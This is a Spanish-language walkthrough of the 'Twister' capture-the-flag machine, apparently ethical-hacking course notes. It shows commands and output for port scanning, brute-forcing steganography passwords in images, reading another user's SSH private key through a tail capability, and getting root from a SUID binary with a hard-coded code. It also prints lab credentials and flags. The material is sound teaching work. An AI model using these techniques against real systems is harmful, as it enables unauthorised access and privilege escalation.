---
title: "🖥️ Máquina: Twister — Hacking Ético"
aliases:
  - Twister
  - twisted
  - Máquina Twister
  - VM Twister
  - Writeup Twister
tags:
  - ifct0109
  - hacking-etico
  - vms
  - avanzadas
  - linux
  - ctf
---

# 🖥️ Máquina: Twister

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Avanzadas  
> **Técnicas trabajadas:** Esteganografía (stegcracker + steghide) · Movimiento lateral · Linux Capabilities · Lectura de archivos protegidos (tail) · Ingeniería inversa (dogbolt) · Escalada de privilegios (binario SUID)  
> **Descripción:** En esta práctica extraeremos credenciales ocultas en imágenes mediante esteganografía, nos moveremos entre usuarios aprovechando la capability cap_dac_read_search sobre tail para leer una clave SSH privada protegida, y escalaremos privilegios resolviendo el código de un binario SUID mediante ingeniería inversa.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.61`
* **`RHOST` (Víctima / Twister):** Ej. `10.0.0.71`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Twister tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -p- 10.0.0.71
```

```text
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

```bash
nmap -v -A -p 80,2222 10.0.0.71
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!info] Resultado
> El servidor web está en el puerto 80 y SSH en el puerto 2222 en lugar del habitual 22. Exploramos la web:

---

## 🖼️ Fase 2: Esteganografía

```bash
curl 'http://10.0.0.71'
```

```text
<h1>I love cats!</h1>
<img src="cat-original.jpg">
<h1>But I prefer this one because seems different</h1>
<img src="cat-hidden.jpg">
```

> [!info] Resultado
> La web muestra dos imágenes. El mensaje "seems different" es una pista de que algo está oculto en ellas. Descargamos ambas para analizarlas:

```bash
wget http://10.0.0.71/cat-original.jpg
```

```bash
wget http://10.0.0.71/cat-hidden.jpg
```

Instalamos stegcracker y lanzamos fuerza bruta sobre ambas imágenes para encontrar la contraseña del contenido oculto:

```bash
sudo apt update && sudo apt install stegcracker -y
```

```bash
stegcracker cat-original.jpg
```

```text
Successfully cracked file with password: westlife
```

```bash
stegcracker cat-hidden.jpg
```

```text
Successfully cracked file with password: sexymama
```

> [!info] Resultado
> Ambas imágenes tienen contenido oculto protegido con contraseña. Extraemos los archivos con las contraseñas encontradas:

```bash
steghide extract -sf cat-original.jpg -p westlife
```

```text
anotó los datos extraídos en "markus.txt".
```

```bash
steghide extract -sf cat-hidden.jpg -p sexymama
```

```text
anotó los datos extraídos en "mateo.txt".
```

```bash
cat markus.txt
```

```text
markuslovesbonita
```

```bash
cat mateo.txt
```

```text
thisismypassword
```

> [!info] Resultado
> Dos pares de credenciales:
> · markus:markuslovesbonita
> · mateo:thisismypassword
> Si entramos con mateo llegamos a un rabbit hole que no lleva a ningún sitio útil. Seguimos con markus.

---

## 🔑 Fase 3: Acceso SSH como markus

```bash
ssh markus@10.0.0.71 -p 2222
```

```text
markus@10.0.0.71's password: markuslovesbonita
```

```bash
ls
```

```bash
cat note.txt
```

```text
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
```

> [!info] Resultado
> La nota indica que hay una clave privada SSH de bonita en /var/cache/apt/id_rsa. Intentamos leerla:

```bash
cat /var/cache/apt/id_rsa
```

```text
cat: /var/cache/apt/id_rsa: Permission denied
```

> [!info] Resultado
> No tenemos permisos de lectura con cat. Buscamos otras formas revisando las Linux Capabilities del sistema. Las capabilities son permisos especiales que se pueden asignar a binarios concretos para que realicen operaciones privilegiadas sin necesitar ser SUID completos. La capability cap_dac_read_search permite a un binario saltarse las comprobaciones de permisos de lectura en archivos y directorios:

```bash
/usr/sbin/getcap / -r 2>/dev/null
```

```text
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

```bash
🔵 Alternativa — descubrir capabilities con linpeas:
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh
```

```text
Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

---

## 📋 Fase 4: Lectura de clave SSH con tail

tail tiene la capability cap_dac_read_search, lo que le permite leer cualquier archivo del sistema ignorando los permisos. Usamos -n 100 para leer las últimas 100 líneas, suficientes para capturar la clave completa:

```bash
tail /var/cache/apt/id_rsa -n 100
```

> [!info] Resultado
> Obtenemos la clave privada de bonita. La guardamos en un archivo y volvemos a Kali:

```bash
tail /var/cache/apt/id_rsa -n 100 > id_bonita
```

```bash
exit
```

Desde Kali descargamos el archivo con scp especificando el puerto 2222:

```bash
scp -P 2222 markus@10.0.0.71:/home/markus/id_bonita ./
```

```bash
chmod 600 id_bonita
```

```bash
ssh -i id_bonita -p 2222 bonita@10.0.0.71
```

```bash
id
```

```text
uid=1002(bonita) gid=1002(bonita) groups=1002(bonita)
```

```bash
cat user.txt
```

```text
HMVblackcat
```

> [!info] Resultado
> Flag de usuario obtenida: HMVblackcat

---

## 🚀 Fase 5: Escalada de privilegios — ingeniería inversa del binario SUID

Buscamos binarios con el bit SUID activado:

```bash
find / -perm -u=s 2>/dev/null
```

```text
/home/bonita/beroot
```

```bash
ls -l /home/bonita/beroot
```

```text
-rwsrws--- 1 root bonita 16864 Oct 14 2020 /home/bonita/beroot
```

```bash
./beroot
```

```text
Enter the code:
```

> [!info] Resultado
> El binario pertenece a root, tiene el bit SUID activado y solo es ejecutable por el grupo bonita. Pide un código numérico. Inspeccionamos las cadenas de texto del binario:

```bash
strings ./beroot
```

```text
Enter the code:
/bin/bash
WRONG
```

> [!info] Resultado
> Si el código es correcto lanza /bin/bash con privilegios de root. Necesitamos descubrir el valor esperado. Descargamos el binario a Kali para descompilarlo:

```bash
scp -P 2222 -i id_bonita bonita@10.0.0.71:/home/bonita/beroot ./
```

```bash
file beroot
```

```text
beroot: ELF 64-bit LSB executable, x86-64, dynamically linked
```

> [!info] Resultado
> Lo subimos a https://dogbolt.org/ para descompilarlo. Con el descompilador angr encontramos la función que gestiona el código:

```text
printf("Enter the code:\n ");
scanf("%i", &v2);
if (v2 != 5880)
{
    puts("\nWRONG");
    return 0;
}
// Si el código es correcto lanza /bin/bash
```

> [!info] Resultado
> El binario lee un entero con scanf("%i", &v2) y lo compara con 5880. Si coincide ejecuta /bin/bash heredando los privilegios SUID de root. Volvemos a la shell de bonita y lo probamos:

```bash
./beroot
```

```text
Enter the code:
 5880
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

```text
HMVwhereismycat
```

> [!info] Resultado
> Flag de root obtenida: HMVwhereismycat

> [!warning] Advertencia
> ⚠️ Nota: La capability cap_dac_read_search sobre tail permitiría leer directamente las flags del sistema sin seguir el camino previsto, lo que es posiblemente un fallo de configuración de la máquina. El procedimiento descrito sigue el camino correcto y más didáctico.

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
